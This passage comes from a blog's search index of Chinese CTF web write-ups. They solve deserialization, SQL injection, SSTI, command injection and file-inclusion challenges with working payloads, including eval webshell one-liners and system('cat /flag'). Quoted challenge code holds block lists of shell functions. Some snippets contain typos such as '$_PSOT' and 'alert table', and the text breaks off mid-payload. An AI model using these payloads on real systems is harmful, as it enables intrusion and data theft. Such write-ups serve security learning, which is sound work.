$profile[&#x27;phone&#x27;];\t\t$email = $profile[&#x27;email&#x27;];\t\t$nickname = $profile[&#x27;nickname&#x27;];\t\t$photo = base64_encode(file_get_contents($profile[&#x27;photo&#x27;]));?&gt;\n\n调用class的用户查询函数，返回值并进行反序列化，这里我们遇到了一个\nfile_get_contents\n\n这个函数，是将整个文件读取到一个字符串中。\n整理一下思路 flag在config.php中，想要得到flag 就要读取 这个文件 ，正好存在 一个函数 可以 将文件内容读取 到字符串中，因此我们现在需要构造$profile的序列化格式中 $profile=config.php,因此进一步看 show_profile()这个函数的功能。就是获取username的值调用filter（）对其进行过滤，是将黑名单里面的值替换成 _ 或者hacker,这里感觉像是之前unctf做的反序列化逃逸\n接下来看看register.php和update.php对用户名 存不存在过滤\n\nregister.php这里限制了用户名的长度,这一下子就给我难住了。没有办法只能 再看看update.php\n&lt;?php\trequire_once(&#x27;class.php&#x27;);\tif($_SESSION[&#x27;username&#x27;] == null) &#123;\t\tdie(&#x27;Login First&#x27;);\t\t&#125;\tif($_POST[&#x27;phone&#x27;] &amp;&amp; $_POST[&#x27;email&#x27;] &amp;&amp; $_POST[&#x27;nickname&#x27;] &amp;&amp; $_FILES[&#x27;photo&#x27;]) &#123;\t\t$username = $_SESSION[&#x27;username&#x27;];\t\tif(!preg_match(&#x27;/^\\d&#123;11&#125;$/&#x27;, $_POST[&#x27;phone&#x27;]))\t\t\tdie(&#x27;Invalid phone&#x27;);\t\tif(!preg_match(&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;, $_POST[&#x27;email&#x27;]))\t\t\tdie(&#x27;Invalid email&#x27;);\t\t\t\tif(preg_match(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; 10)\t\t\tdie(&#x27;Invalid nickname&#x27;);\t\t$file = $_FILES[&#x27;photo&#x27;];\t\tif($file[&#x27;size&#x27;] &lt; 5 or $file[&#x27;size&#x27;] &gt; 1000000)\t\t\tdie(&#x27;Photo size error&#x27;);\t\tmove_uploaded_file($file[&#x27;tmp_name&#x27;], &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]));\t\t$profile[&#x27;phone&#x27;] = $_POST[&#x27;phone&#x27;];\t\t$profile[&#x27;email&#x27;] = $_POST[&#x27;email&#x27;];\t\t$profile[&#x27;nickname&#x27;] = $_POST[&#x27;nickname&#x27;];\t\t$profile[&#x27;photo&#x27;] = &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]);\t\t$user-&gt;update_profile($username, serialize($profile));\t\techo &#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;;\t&#125;\telse &#123;?&gt;\n\n我们发现这里又多了一个nickname，啊为啥会有两个，去题目页面尝试一下\n\n经过尝试，发现 注册的那个相当于 你的qq号，nickname相当于你的qq名，长度问题迎刃而解。分析一下 update.php对nickname的限制吧。保证nickname都是正常大小写字符加数字 并且长度不大于10，因此结合上述分析，我们应该是利用反序列化逃逸将$profile[‘photo’]的值溢出，传入我们需要的值。并将nickname修改为数组让过strlen函数对长度的检测。\n因此构造payload\nwherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:“photo”;s:10:“config.php”;&#125;\n\n\n\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"BJDCTF 2nd之假猪套天下第","url":"https://husins.cn/BJDCTF-2nd之假猪套天下第/","content":"知识点\nClient-ip可以代替xff\nvia：添加代理服务器\nFrom：邮箱地址\n解题\n\n打开题目 是一个 登陆页面，尝试admin登陆\n\n登陆失败\n\n空值，有被气到，骂他一分钟*****\n随便一个用户名\n可以正常登陆\n\n但是没有 有用 信息，只能思考 这个题 有用信息 在这那 ，在 登录框 抓包 寻找 突破口\n\n发现 提示了个L0g1n.php 看一下吧\n\n说要 99 年 才行。抓包 看看能不能修改时间。\n\n这里 有个时间改为 一个极大值\n\n提示 本地 登陆  使用xff 。\n\nxff不能用，裂开 百度 其他 可以 实现 本地 的方法。\n发现Client-ip也可以。\n\n他可真墨迹，还要 来自浏览器 ，使用 referer头。\n\n需要来自这个 浏览器 真墨迹！！！\n\n修改之后发现 页面 没有 变化 ，名字 不对 百度 一下这个浏览器，我发现 我中计了，原来 还有 全称Commodore 64  \n\n好家伙 还要邮箱地址。 这里 需要 From头。\n\n\n墨迹就算了 还要收费。所以添加代理服务器头！使用Via请求头\n\n base64解码，得到flag。\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"网鼎杯2020 朱雀组之phpweb","url":"https://husins.cn/网鼎杯2020-朱雀组之phpweb/","content":"知识点\ncall_user_func（）函数的用法，及其功能。\n解题\n\n打开题目 存在 一个警告，还有一个时间戳。\n\n看警告信息，应该是 页面那个时间戳的定义了一个date函数 产生的警告。\nF12查看 数据包，发现 页面是个动态页面，使用burpsuit抓取数据包。\n\n我们 发现 发出包里面存在 两个 参数 ，结合 上面 的 警告信息 我们可以 知道  func是用来 调用函数的，p是用来 输出 时间戳 格式的，结合二者，猜测使用了：call_user_func(函数名，参数)函数\n因此构造payload读取源码\nfunc=file_get_contents&amp;p=index.php\n\n&lt;?php    $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);    function gettime($func, $p) &#123;        $result = call_user_func($func, $p);        $a= gettype($result);        if ($a == &quot;string&quot;) &#123;            return $result;        &#125; else &#123;return &quot;&quot;;&#125;    &#125;    class Test &#123;        var $p = &quot;Y-m-d h:i:s a&quot;;        var $func = &quot;date&quot;;        function __destruct() &#123;            if ($this-&gt;func != &quot;&quot;) &#123;                echo gettime($this-&gt;func, $this-&gt;p);            &#125;        &#125;    &#125;    $func = $_REQUEST[&quot;func&quot;];    $p = $_REQUEST[&quot;p&quot;];    if ($func != null) &#123;        $func = strtolower($func);        if (!in_array($func,$disable_fun)) &#123;            echo gettime($func, $p);        &#125;else &#123;            die(&quot;Hacker...&quot;);        &#125;    &#125;    ?&gt;\n\n观察源码，好多函数被ban，还存在一个class类  可以尝试 用 反序列化进行绕过。\n\n读取tmp文件夹\n\n读取这个文件 即可。\n\n得到flag。\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"GKCTF2020之CheckIN","url":"https://husins.cn/GKCTF2020之CheckIN/","content":"知识点\nphp7-gc-bypass漏洞利用PHP garbage collector程序中的堆溢出触发进而执行命令影响范围是linux，php7.0-7.3\n解题\n&lt;title&gt;Check_In&lt;/title&gt;&lt;?php highlight_file(__FILE__);class ClassName&#123;        public $code = null;        public $decode = null;        function __construct()        &#123;                $this-&gt;code = @$this-&gt;x()[&#x27;Ginkgo&#x27;];                $this-&gt;decode = @base64_decode( $this-&gt;code );                @Eval($this-&gt;decode);        &#125;        public function x()        &#123;                return $_REQUEST;        &#125;&#125;new ClassName();\n\n观察源代码，我们 不难发现，Get传参Ginkgo，$this-&gt;decode可以进行命令执行，尝试上传 一句话木马，连接蚁剑。\n\n发现flag在根目录但是 没有 权限 下面 存在 一个readflag函数，猜测应该是通过readflag这个文件来读取flag文件。\n\n打开之后发现是 一堆乱码。裂开。\n\n看一下phpinfo(); php版本是7.3.18 百度 是否存在 cve漏洞。\n\n果然 存在 远程代码执行漏洞， 直接 网上 找到 exp 利用\nexp地址：\nhttps://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php\n\n\n下载 之后 利用 命令执行漏洞 执行 readflag 文件 读取 flag\n因为 一般 情况下 tmp 文件夹权限 都比较高，因此 上传到tmp文件夹。\n\n上传之后，get传参 包含 这个文件 即可\n\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"BJDCTF2020之ZJCTF，不过如此","url":"https://husins.cn/BJDCTF2020之ZJCTF，不过如此/","content":"知识点\npreg_replace(): The /e modifier is deprecated, use preg_replace_callback instead这个修饰符的意思 就是让 正则替换的 时候 替换规则 支持 php 代码 参考文章：https://xz.aliyun.com/t/2557\n\n解题\n\n分析代码,ge传入两个参数text和file,text参数利用file_get_contents()函数只读形式打开，打开后内容要与”I have a dream”字符串相匹配，才能执行下面的文件包含$file参数。看到用的是file_get_contents()函数打开text参数，以及后面的文件包含函数，自然的想到php伪协议中的data://协议\n构造payload\nindex.php?text=data://text/plain,I have a dream&amp;file=php://filter/convert.base64-encode/resource=next.php\n\n读取到next.php文件的内容\n&lt;?php$id = $_GET[&#x27;id&#x27;];$_SESSION[&#x27;id&#x27;] = $id;function complex($re, $str) &#123;    return preg_replace(        &#x27;/(&#x27; . $re . &#x27;)/ei&#x27;,        &#x27;strtolower(&quot;\\\\1&quot;)&#x27;,        $str    );&#125;foreach($_GET as $re =&gt; $str) &#123;    echo complex($re, $str). &quot;\\n&quot;;&#125;function getFlag()&#123;\t@eval($_GET[&#x27;cmd&#x27;]);&#125;\n\n这里存在  /e  也就是 preg_replace 远程命令执行漏洞。\n思路是利用这个代码执行，执行源码中的getFlag()函数，在传入cmd参数，再利用getFlag中的eval（）函数，再进行一个代码执行。俄罗斯套娃。\n因此 构造 payload\nnext.php?\\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#x27;cat /flag&#x27;);\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"GWCTF 2019之我有一个数据库","url":"https://husins.cn/GWCTF-2019之我有一个数据库/","content":"知识点\nphpmyadmin 4.8.1 远程文件包含漏洞（CVE-2018-12613）\n解题\n\n打开题目 啥也没有 dirsearch 扫出来一个phpmyadmin的后台，观察版本，phpmyadmin 4.8.1存在任意文件读取漏洞。直接冲\n\n上payload的读取/etc/passwd 读取成功\n\n读取flag\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"安洵杯 2019之easy_web","url":"https://husins.cn/安洵杯-2019之1easy-web/","content":"知识点\n\nMD5强类型比较碰撞\na=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2   &amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2\n\n\n\n\n\n\nlinux 命令 混合\\ 仍能正常执行。\n\n解题\n\n一开始 面对 这道题 的思路是 F12 看到 MD5 is funny 然后 url栏 里面 存在 cmd 以为啥 命令执行bypass\n\n尝试了很多命令，发现都没有用，看来我走上了歧途\n看了 别的 大佬的 wp 发现 我忽略了 一个点 这里 还传参了 一个 img尝试 base64 解码\n\n\n\n解码的规律是 base64-&gt;base64-&gt;hex\n尝试逆推得到读取index.php\n这里 还有 一个坑 就是 Hex编码 有带%和不带%两种形式，一开始 不知道，用站长工具做了半天，也没弄出来 很伤 这道题 就是用的不带%的形式\n\n逆推之后 可以 得到index.php的base64 编码的值\n&lt;?phperror_reporting(E_ALL || ~ E_NOTICE);header(&#39;content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);$cmd &#x3D; $_GET[&#39;cmd&#39;];if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;]))     header(&#39;Refresh:0;url&#x3D;.&#x2F;index.php?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;&#39;);$file &#x3D; hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));$file &#x3D; preg_replace(&quot;&#x2F;[^a-zA-Z0-9.]+&#x2F;&quot;, &quot;&quot;, $file);if (preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $file)) &#123;    echo &#39;&lt;img src &#x3D;&quot;.&#x2F;ctf3.jpeg&quot;&gt;&#39;;    die(&quot;xixi～ no flag&quot;);&#125; else &#123;    $txt &#x3D; base64_encode(file_get_contents($file));    echo &quot;&lt;img src&#x3D;&#39;data:image&#x2F;gif;base64,&quot; . $txt . &quot;&#39;&gt;&lt;&#x2F;img&gt;&quot;;    echo &quot;&lt;br&gt;&quot;;&#125;echo $cmd;echo &quot;&lt;br&gt;&quot;;if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\&#39;|\\&quot;|\\&#96;|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd)) &#123;    echo(&quot;forbid ~&quot;);    echo &quot;&lt;br&gt;&quot;;&#125; else &#123;    if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123;        echo &#96;$cmd&#96;;    &#125; else &#123;        echo (&quot;md5 is funny ~&quot;);    &#125;&#125;?&gt;&lt;html&gt;&lt;style&gt;  body&#123;   background:url(.&#x2F;bj.png)  no-repeat center center;   background-size:cover;   background-attachment:fixed;   background-color:#CCCCCC;&#125;&lt;&#x2F;style&gt;&lt;body&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;\n\n\n过滤的 很严实 GET传参img 只能是大小写 数字 和 点，cmd 命令执行 还被 过滤了 一大堆，而且 要命令执行 还要 MD5 强碰撞，本来数组形式 可以绕过，但是 做了 类型转换 只能强碰撞，强碰撞 方法 就是 比较固定的\na=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2\nbypass 强类型之后 就可以 命令执行 我们 发现 dir 没有被过滤\n\n在 根目录 找到flag文件 并读取，这里 我们 知道 linux 里面 命令 混合\\仍然能 正常执行。\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"BUUCTF 2018之Online Tool","url":"https://husins.cn/BUUCTF-2018之Online-Tool/","content":"知识点：\n两个函数复用造成命令执行。\n\n这是一道nmap的题，看源码 host 传参 使我们可控的 经过两个函数后 MD5加盐编码之后 得到一个新的MD5值 生成一个 新的目录\n下一步 查看 那两不认识的函数 作用\nescapeshellarg:将参数中的字符串两侧加上&#39;,并将其中的&#39;进行转义 然后在两侧加上&#39;达到拼接的目的\nescapeshellcmd:将参数中的字符串中间的特殊字符转义,并且将落单的&#39;进行转义\n也就是说两个函数连续使用会造成&#39;未被转义,从而触发命令执行\n又看到了 生成 新的目录 ，想到 文件 写入  写入 一句话 木马\n#正常传参 利用 nmap 写入文件?host= &lt;?php eval($_PSOT[&quot;cmd&quot;]);?&gt; -oG cmd.php#经过escapeshellarg?host= &#x27;&lt;?php eval($_PSOT[&quot;cmd&quot;]);?&gt; -oG cmd.php&#x27;#经过escapeshellcmd没啥效果，linux会将&#x27;&#x27;里面的当做字符串，不会解析变量(双引号中的变量仍会解析),这样我们的shell就无法写入#从新传参?host= &#x27;&lt;?php eval($_PSOT[&quot;cmd&quot;]);?&gt; -oG cmd.php&#x27;#经过escapeshellarg?host= &#x27;\\&#x27;&lt;?php eval($_PSOT[&quot;cmd&quot;]);?&gt;&#x27; &#x27;-oG cmd.php\\&#x27; #经过escapeshellcmd?host= &#x27;&#x27;\\\\&#x27;&lt;?php eval($_PSOT[&quot;cmd&quot;]);?&gt;&#x27;&#x27; &#x27;&#x27;-oG cmd.php\\\\&#x27;&#x27;#简化一下?host= \\&lt;?php eval($_PSOT[&quot;cmd&quot;]);?&gt; -oG cmd.php \\\\&#x27;&#x27;达到效果\n\n连接菜刀 拿到flag\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"MRCTF2020之Ez_bypass","url":"https://husins.cn/MRCTF2020之Ez-bypass/","content":"[MRCTF2020]Ez_bypass知识点\nMD5强类型比较绕过，传入的两个变量均为数组 均为false可以绕过\nis_numeric函数 判断 16进制数 返回也是true 且能被%00截断\n\n解题\n\n打开题目，查看提示\n\n查看源码，存在三处绕过，MD5强类型比较绕过，传入的两个变量均为数组，且是不同的值即可，第二个$_POST传参绕过is_numeric，和“==”一般两种做法 数字结尾拼接不是数字的值，第二种%00截断\n构造payload：\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"网鼎杯2020 青龙组之AreUSerialz","url":"https://husins.cn/网鼎杯2020-青龙组之AreUSerialz/","content":"知识点\nphp强类型比较，可以通过 不同类型 达到绕过目的\nphp7.1以上版本 对类的类型定义不敏感\nfile_get_contents 伪协议文件读取\n\n&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123;    protected $op;    protected $filename;    protected $content;    function __construct() &#123;        $op = &quot;1&quot;;        $filename = &quot;/tmp/tmpfile&quot;;        $content = &quot;Hello World!&quot;;        $this-&gt;process();    &#125;    public function process() &#123;        if($this-&gt;op == &quot;1&quot;) &#123;            $this-&gt;write();        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;            $res = $this-&gt;read();            $this-&gt;output($res);        &#125; else &#123;            $this-&gt;output(&quot;Bad Hacker!&quot;);        &#125;    &#125;    private function write() &#123;        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;            if(strlen((string)$this-&gt;content) &gt; 100) &#123;                $this-&gt;output(&quot;Too long!&quot;);                die();            &#125;            $res = file_put_contents($this-&gt;filename, $this-&gt;content);            if($res) $this-&gt;output(&quot;Successful!&quot;);            else $this-&gt;output(&quot;Failed!&quot;);        &#125; else &#123;            $this-&gt;output(&quot;Failed!&quot;);        &#125;    &#125;    private function read() &#123;        $res = &quot;&quot;;        if(isset($this-&gt;filename)) &#123;            $res = file_get_contents($this-&gt;filename);        &#125;        return $res;    &#125;    private function output($s) &#123;        echo &quot;[Result]: &lt;br&gt;&quot;;        echo $s;    &#125;    function __destruct() &#123;        if($this-&gt;op === &quot;2&quot;)            $this-&gt;op = &quot;1&quot;;        $this-&gt;content = &quot;&quot;;        $this-&gt;process();    &#125;&#125;function is_valid($s) &#123;    for($i = 0; $i &lt; strlen($s); $i++)        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))            return false;    return true;&#125;if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123;    $str = (string)$_GET[&#x27;str&#x27;];    if(is_valid($str)) &#123;        $obj = unserialize($str);    &#125;&#125;\n\n将代码 分段 分析。\nfunction is_valid($s) &#123;    for($i = 0; $i &lt; strlen($s); $i++)        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))            return false;    return true;&#125;if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123;    $str = (string)$_GET[&#x27;str&#x27;];    if(is_valid($str)) &#123;        $obj = unserialize($str);    &#125;&#125;\n\nGET传参，is_valid() 判断字符串的ascii值是否在32~~125之间。存在反序列化函数，调用析构函数。下一步查看析构函数。\nfunction __destruct() &#123;        if($this-&gt;op === &quot;2&quot;)            $this-&gt;op = &quot;1&quot;;        $this-&gt;content = &quot;&quot;;        $this-&gt;process();        &#125;\n\n析构函数 判断 op 强比较 是都 等于 字符型 2  如果等于 替换为 字符型 1.，将content替换为空。 调用process函数。\n public function process() &#123;     if($this-&gt;op == &quot;1&quot;) &#123;         $this-&gt;write();     &#125; else if($this-&gt;op == &quot;2&quot;) &#123;         $res = $this-&gt;read();         $this-&gt;output($res);     &#125; else &#123;         $this-&gt;output(&quot;Bad Hacker!&quot;);     &#125; &#125;private function output($s) &#123;     echo &quot;[Result]: &lt;br&gt;&quot;;     echo $s; &#125;\n\nprocess() 完成读写功能。 我们 应该要使用读取操作 得到flag output() 是输出字符串\nprivate function read() &#123;        $res = &quot;&quot;;        if(isset($this-&gt;filename)) &#123;            $res = file_get_contents($this-&gt;filename);        &#125;        return $res;    &#125;\n\n利用 file_get_contents 来读取 文件 想到 伪协议。\n整理一下思路：\n​    构造序列化字符串，让op=2 并且 利用php伪协议 读取 flag。\nop=2  可以利用 强类型 比较   要比较 类型  2是int型  “2”是string型 可以绕过。\nPHP伪协议：filename=php://filter/read=convert.base64-encode/resource=flag.php\n最后 绕过 那个 ascii码比较函数，因为protected私有化的时候会出现%00 他的ascii的值 是 0 不符合 可以使用php7.1以上版本 对类的类型定义不敏感 改为public绕过。\n构造payload\n\n?str=O:11:&quot;FileHandler&quot;:2:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;\n\n\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"攻防世界之bug","url":"https://husins.cn/攻防世界之bug/","content":"\n打开之后是个登陆页面  有 登陆 注册 改密码 功能\n\n\n注册一个test账号 发现Manage点不开提示我不是admin，因此想办法找到admin登陆，这里想到修改密码这个功能 能不能越权修改admin密码。\n\n\n这里填完信息之后，发现身份已经通过，我们可以推测逻辑是 判断身份，然后 修改密码 这时只要能够将test改为admin即可越权修改admin密码了。\n\n将这里的test改为admin成功修改admin密码\n\n\n用xff头 伪造ip 得到提示\n？？？ 尝试 flag 不可以  想到 进后台 要传马  想到upload\n\n上传图片马，然后发现有过滤，然后多次尝试发现 phtml 能够绕过，但是解析不太正常 php4 php5 可以正常  而且 一句话中不能存在 . 而且找不到上传路径 选择直接命令执行。\n\n","categories":["CTF题解"],"tags":["攻防世界"]},{"title":"攻防世界之cat","url":"https://husins.cn/攻防世界之cat/","content":"\n\n打开题目 测试提示数据，发现没有反应 看提示 是个网址 就测试127.0.0.1 发现是ping 第一反应 是命令执行\n\n但是行不通 但是 我们发现 url 传参 可以修改 编码值\n\n\n传递%80，url编码使用的是16进制，80也就是128，ASCII码是从0-127，所以这个时候会报错\n查看报错 发现 使用 的是Django\n查找api有关信息\n\n这里存在数据库相关信息。\n尝试访问\n这里要注意：\n\n因此\nhttp://220.249.52.133:30703/index.php?url=@/opt/api/database.sqlite3\n\n\n得到flag。\n","categories":["CTF题解"],"tags":["攻防世界"]},{"title":"攻防世界之shrine","url":"https://husins.cn/攻防世界之shrine/","content":"打开题目，好家伙，python，想到ssti模板注入。\nimport flask import os app = flask.Flask(__name__)          #对flask模块进行实例化app.config[&#x27;FLAG&#x27;] = os.environ.pop(&#x27;FLAG&#x27;)    #清除FLAG环境变量，并将其保存在app.config中@app.route(&#x27;/&#x27;) \tdef index():         return open(__file__).read()           #路由转发到/shrine/路径下    \t@app.route(&#x27;/shrine/&#x27;)         def shrine(shrine):     \tdef safe_jinja(s):        \t\ts = s.replace(&#x27;(&#x27;, &#x27;&#x27;).replace(&#x27;)&#x27;, &#x27;&#x27;)         \tblacklist = [&#x27;config&#x27;, &#x27;self&#x27;] \t\t\t\t#过滤 （） ，config，self        \treturn &#x27;&#x27;.join([&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;.format(c) for c in blacklist]) + s     return flask.render_template_string(safe_jinja(shrine)) if __name__ == &#x27;__main__&#x27;:     app.run(debug=True)\n\n根据分析 我们应该在 /shrine/ 路径下查看 app.config[‘FLAG’] 的内容 就能得到flag。\n\nhttp://220.249.52.133:40596/shrine/&#123;&#123;4&#125;&#125;\n\n证明存在  ssti  下一步 想办法 绕过 过滤 读取 信息\n\n/shrine/&#123;&#123;url_for.__globals__&#125;&#125;globals 函数返回一个全局变量的字典，包括所有导入的变量。\n\n\n/shrine/&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;]&#125;&#125;\n\n这个就是之前实例化对象app 查看 他的config即可\n\n/shrine/&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config[&#x27;FLAG&#x27;]&#125;&#125;\n\n","categories":["CTF题解"],"tags":["攻防世界"]},{"title":"护网杯2018-easy_tornado","url":"https://husins.cn/护网杯2018-easy-tornado/","content":"\n\n打开三个txt文件 获取信息如上\n\n那么接下来 思路就很清晰 只要找到 MD5里面 cookie_secret这个盐值 就可以了\n\n\n在测试url栏传参是发现，还有第四个页面 也就是报错页面，联系题目提示这里可能存在模板注入（因为关于python我知道模板注入）\n\n确认存在模板注入 接下来的思路就是 通过模板注入找到盐值，\n正确的思路就是要去看开发文档，看看什么能够读取cookie_secret\n\nhandler.settings，handler 指向RequestHandler，\n而RequestHandler.settings又指向self.application.settings，\n所以handler.settings就指向RequestHandler.application.settings了\n\n直接获取到盐值\n利用python，加密带盐的MD5值\n\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"强网杯 2019-随便注","url":"https://husins.cn/强网杯-2019-随便注/","content":"\n\n输入单引号报错，\n\n单引号闭合\n\n两个字段。\n\n好家伙，select给我ban了\n\n\n好家伙内联注释也用不了。\n\n\n堆叠注入可以，查到了库名和表名。\n\n\n分别查询 两个字段里面的信息\n在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符\n分析可知\n\n输出点应该是在 id字段\n\nflag存在于supersqli数据库中的1919810931114514表的flag字段。\n\n\n下面就要开始骚姿势了。\n由于正则字段中的数据是查询不出来了的，只有两种方式，\n\n预编译绕过正则\n\n将flag所在的表和flag都变成words和id 直接查询输出\n\n\n预编译\nset 用于设置变量名和值prepare 用于预备一个语句，并赋予名称，以后可以引用该语句execute 执行语句deallocate prepare 用来释放掉预处理的语句\n\n因此构造payload\nset  @sql&#x3D;CONCAT(&#39;se&#39;,&#39;lect * from &#96;1919810931114514&#96;;&#39;);prepare test from @sql;EXECUTe test;\n\n1&#39;set  @sql=CONCAT(&#39;se&#39;,&#39;lect * from 1919810931114514;&#39;);prepare test from @sql;EXECUTe test;#\n\nstrstr（）函数可以大小写绕过\n修正payload：\n1&#39;;Set @sql &#x3D; CONCAT(&#39;se&#39;,&#39;lect * from &#96;1919810931114514&#96;;&#39;);Prepare test from @sql;EXECUTe test;#\n\n\n得到flag\n修改表名\n修改表名(将表名user改为users)alter table user rename to users;修改列名(将字段名username改为name)alter table users change uesrname name varchar(30);\n\n因此构造payload：\nalert table words rename to 123;alert table &#96;1919810931114514&#96; rename to words;alert table words change flag id int(40);\n\n1&#39;;alert table words rename to     123;alert table &#96;1919810931114514&#96; rename to words;alert table words change flag id varchar(50);#\n\n\n使用1‘ or 1=1 # 得到flag。\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"网鼎杯 2018-Fakebook","url":"https://husins.cn/网鼎杯-2018-Fakebook/","content":"\n打开题目注册登录 得到如上界面\n\n查看源码，发现一个view.php\n\n输出单引号报错，可能存在sql注入，进行下一步尝试。\nview.php?no&#x3D;1 and 1&#x3D;1view.php?no&#x3D;1 and 1&#x3D;2view.php?no&#x3D;1 order by 5view.php?no&#x3D;0 union select 666,777,888,999这里发现触发了WAF，尝试内联注释，混淆绕过view.php?no&#x3D;0 &#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F; 666,777,888,999view.php?no&#x3D;0 &#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F; 666,database(),888,999库名：fakebookview.php?no&#x3D;0 &#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F; 1,table_name ,3,4 from information_schema.tables where table_schema&#x3D;&#39;fakebook&#39;表名：usersview.php?no&#x3D;0 &#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F; 1,column_name,3,4 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39;字段名：no username passwd dataview.php?no&#x3D;0 &#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F; union&#x2F;**&#x2F;select 1,data,3,4 from 